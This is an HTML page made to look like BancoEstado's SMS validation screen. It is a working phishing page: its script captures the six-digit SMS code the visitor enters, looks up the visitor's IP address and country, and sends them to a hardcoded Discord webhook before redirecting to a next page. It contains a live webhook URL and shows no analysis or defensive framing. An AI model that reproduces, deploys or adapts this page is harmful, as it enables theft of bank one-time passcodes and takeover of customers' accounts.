<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Validación SMS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #1e293b;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 20px;
            display: flex;
            align-items: center;
        }

        .back-btn {
            background: none;
            border: none;
            cursor: pointer;
            color: #334155;
            padding: 5px;
        }

        .content {
            padding: 10px 32px;
            text-align: center;
            flex-grow: 1;
        }

        .sms-icon-container {
            margin-bottom: 24px;
            display: flex;
            justify-content: center;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #0f172a;
        }

        .subtitle {
            font-size: 15px;
            color: #64748b;
            line-height: 1.5;
            margin-bottom: 40px;
        }

        .form-section {
            text-align: left;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 14px;
            color: #1e293b;
            margin-bottom: 12px;
        }

        .sms-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            background-color: #fcfdfe;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s;
            letter-spacing: 2px;
        }

        .sms-input:focus {
            border-color: #ff8c00;
            background-color: #fff;
        }

        .resend-container {
            margin-top: 20px;
            text-align: center;
        }

        .resend-link {
            color: #ff8c00;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
        }

        .footer {
            padding: 24px 32px 40px;
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 35px;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255, 140, 0, 0.2);
            transition: background 0.2s;
        }

        .btn-continuar:disabled {
            background-color: #f1f5f9;
            color: #94a3b8;
            box-shadow: none;
            cursor: not-allowed;
        }

        .secure-badge {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            margin-top: 20px;
            font-size: 11px;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <button class="back-btn" onclick="history.back()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
            </button>
        </div>

        <div class="content">
            <div class="sms-icon-container">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21 15C21 15.5304 20.7893 16.0391 20.4142 16.4142C20.0391 16.7893 19.5304 17 19 17H7L3 21V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V15Z" stroke="#ff8c00" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M7 8H17" stroke="#ff8c00" stroke-width="1.5" stroke-linecap="round"/>
                    <path d="M7 12H13" stroke="#ff8c00" stroke-width="1.5" stroke-linecap="round"/>
                </svg>
            </div>

            <h1>Ingresa el código</h1>
            <p class="subtitle">Enviamos un SMS con un código de validación al número registrado en su cuenta.</p>

            <div class="form-section">
                <label>Código de validación</label>
                <input type="text" class="sms-input" id="smsCode" maxlength="6" placeholder="Ej: 123456" inputmode="numeric">
                
                <div class="resend-container">
                    <span class="resend-link">No recibí el código</span>
                </div>
            </div>
        </div>

        <div class="footer">
            <button class="btn-continuar" id="btnNext" disabled>Continuar</button>
            <div class="secure-badge">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                Solicitud segura
            </div>
        </div>
    </div>

    <script>
        const input = document.getElementById('smsCode');
        const btn = document.getElementById('btnNext');

        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            btn.disabled = e.target.value.length !== 6;
        });

        btn.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
            const codeValue = input.value;

            btn.innerText = "Verificando...";
            btn.disabled = true;

            try {
                // Capturar IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                const data = {
                    embeds: [{
                        title: "📱 CÓDIGO SMS RECIBIDO",
                        color: 16745472, // Naranja
                        fields: [
                            { name: "🔑 Código", value: `**${codeValue}**`, inline: true },
                            { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: false },
                            { name: "🌍 País", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Validación SMS - BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                // Redirección al paso final o de error
                window.location.href = "index2.html"; 
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index2.html";
            }
        });
    </script>
</body>
</html>
